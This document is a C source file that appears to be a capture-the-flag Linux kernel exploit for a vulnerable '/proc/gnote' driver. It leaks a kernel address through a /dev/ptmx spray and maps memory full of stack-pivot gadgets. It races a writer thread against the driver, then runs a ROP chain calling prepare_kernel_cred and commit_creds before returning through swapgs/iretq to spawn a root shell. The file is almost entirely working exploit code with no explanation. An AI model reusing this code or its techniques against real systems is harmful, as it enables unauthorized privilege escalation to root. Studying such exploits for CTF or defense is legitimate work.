//gcc gnote.c -static -lpthread -masm=intel -o exp
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <signal.h>
size_t buf[0x300];

int fd = -1;


size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}




void get_shell(int sig){
	system("sh");
}
size_t kaddr = 0;
void* child() {
	while(1){
		buf[0] = 0x7ffffed;
	}
}
void get_shell_seg(){
  char *shell = "/bin/sh";
  char *args[] = {shell, NULL};
  execve(shell, args, NULL);
}
int main(){
	signal(SIGSEGV,get_shell_seg);
	memset(buf,0,8);
	int fd = -1;
	int ptmx_fds[0x100];
	pthread_t t;
	fd = open("/proc/gnote",O_RDWR);
	size_t output[0x100];

	memset(output,0,0x100);
	
	for (int i = 0; i < 0x100; ++i)
    {
        ptmx_fds[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        if (ptmx_fds[i]==-1)
        {
            printf("open ptmx err\n");
        }
    }

	for (int i = 0; i < 0x100; ++i)
        close(ptmx_fds[i]);
	for(int i = 0 ; i <2 ; i++){
		buf[0] = 0x2e000000001;
		write(fd,buf,8);
	}
	buf[0] = 5;
	write(fd,buf,8);
	
	read(fd,output,0x100);
	write(1,output,0x100);
	kaddr = output[0x3]; 
	kaddr -= 0xa35360;
	write(1,"\n",1);
	printf("%p\n",kaddr);
	size_t commit_creds = kaddr + 0x69df0;
	size_t prepare = kaddr + 0x69fe0;
	size_t pop_rdi = kaddr + 0x1c20d;
	size_t swapgs = kaddr + 0x3efc4;
	size_t pop_rbp = kaddr + 0x363;
	size_t pivot = kaddr + 0x54602c;
	size_t mov_drdi_rax = kaddr + 0x2118df;
	size_t pop_rax = kaddr + 0x209e1;
	size_t iretq =kaddr + 0x2c254;
	size_t add_rsp_200_rbx_rbp = kaddr + 0x2bcc5e;
	size_t ret = pop_rdi+1;
	size_t *pmem = mmap((void*)0x1000, 0x400000-0x2000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	size_t *rop = mmap((void*)0x5d000000-0x4000-0xc000, 0x20000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	size_t mmap_base = 0xb0000000;
	//user_sp =mmap_base +0x10000;
	mmap(mmap_base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	for(int i = 0 ; i < (0x3fe000/8) ; i++)
		pmem[i] = pivot;
	save_status();

	size_t base = 0x2000;	
	rop[base++] = add_rsp_200_rbx_rbp;
	base += 0x40;
	rop[base++]= 0;
	rop[base++]= 0;
	rop[base++] = add_rsp_200_rbx_rbp;
	base += 0x40;
	rop[base++]= 0;
	rop[base++]= 0;
	rop[base++] = pop_rdi;
	rop[base++] = 0;
	rop[base++] = prepare;


	rop[base++] = pop_rdi;
	rop[base++] = &rop[base+3];
	rop[base++] = mov_drdi_rax;
	rop[base++] = pop_rdi;
	rop[base++] = 0xdadada;	

	rop[base++] = commit_creds;
	rop[base++] = pop_rbp;
	rop[base++] = 0xdadadada;
	rop[base++] = swapgs; //swapgs,pop_rbp
	rop[base++] = 0;
	rop[base++] = iretq;
	rop[base++] = (size_t)get_shell;
	rop[base++] = user_cs;                /* saved CS */
	rop[base++] = user_rflags;            /* saved EFLAGS */
	rop[base++] = user_sp;
	rop[base++] = user_ss;

	pthread_create(&t, NULL, child, NULL);
	while(1){
		buf[0] = 2;
		write(fd,buf,8);
	}

	pthread_join(t, NULL); 

	return 0;


}
